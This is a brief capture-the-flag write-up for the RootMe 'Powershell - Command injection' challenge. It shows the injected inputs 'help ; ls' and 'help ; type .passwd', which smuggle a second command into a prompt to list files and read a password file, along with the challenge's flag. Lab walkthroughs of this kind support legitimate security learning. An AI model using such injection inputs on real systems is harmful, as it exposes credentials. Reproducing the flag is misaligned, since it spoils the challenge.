---
title: RootMe Powershell - Command Injection WriteUp
date: 2023-10-03
categories: [RootMe, AppScript]
tags: [RootMe, RootMe - AppScript, WriteUp]
author: barabulkit
---

# Powershell - Command injection

Its just simple command injection

```powershell
> help ; ls
Connect to the database With the secure Password:
76492d1116743f0423413b16050a5345MgB8AEoAMwBYAEgAWQBRAFQAMgBXAFMAbw
B3AFcATQBJADIAcgA5AEMAUgBBAHcAPQA9AHwAN
gA1AGEANAA2ADQAMAAyADIAYgAzAGMAMQBhADAAMABjADIANgA0ADkAMgA2ADUA
OQBmADAAZQBlADQAMwBmADQAZgBhAGMAZABlAGEAZQAwADAAMQA2AGEAYwAx
AGEANwA1ADkAOQA1ADIANABmADQAMwBk
AGMAYQA2AGEAOAAwADYANwAwADUANgA2ADgAMQA4AGIAYgAyAGYAMgAzADAAZ
gBmAGYAYQAzADAAZgBlAGMAMQA3ADYAMAA4AGYA. Backup the table help
Directory: C:\cygwin64\challenge\app-script\ch18
Mode    LastWriteTime   Length Name
----    -------------   ------ ----
-a----  12/12/2021 9:25 AM  43 .git
-a----  11/21/2021 11:34 AM 150 .key
-a----  4/20/2020 10:50 AM  18 .passwd
------  12/12/2021 9:50 AM  574 ._perms
------  11/21/2021 11:35 AM 348 ch18.ps1
```

`help ; type .passwd` and we will get flag `SecureIEXpassword`